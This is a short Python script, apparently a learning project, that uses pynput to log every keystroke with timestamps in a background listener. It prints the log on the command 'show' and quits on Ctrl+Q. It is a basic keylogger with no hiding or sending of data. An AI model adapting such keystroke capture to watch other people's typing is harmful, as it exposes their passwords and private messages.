from pynput import keyboard
from pynput.keyboard import Key, Listener
import datetime
import os

log_dict = {}


def time():# return the current date and time.
    dt = datetime.datetime.now()
    return dt.strftime('%Y-%m-%d %H:%M')


def press(key):# chek exception keys, and save the key press.
    global log_dict
    excption = (Key.tab, Key.enter, Key.alt, Key.alt_gr, Key.backspace, Key.caps_lock, Key.ctrl_r, Key.ctrl_l, Key.shift_l, Key.shift_r)
    if key == Key.space:
        key = " "
    if key in excption:
        key = ""
    if time() in log_dict:
        log_dict[time()] += str(key).replace("'", "")
    else:
        log_dict[time()] = str(key).replace("'", "")


def release(key):# close the program when shortcut is pressed.
    if format(key) == "'\\x11'":#chek if shortcut 'ctrl + q' is pressed:
        os._exit(0)


def key_record():# run the program in background and print keybord log when "show" is input.
    global log_dict
    keyboard_listener = keyboard.Listener(on_press=press,on_release=release)
    keyboard_listener.start()

    while True:
        print_log = input()
        if print_log == "show":
            for t, k in log_dict.items():
                print(t, k, sep="\n")
            log_dict = {}

if __name__ == "__main__":
    key_record()


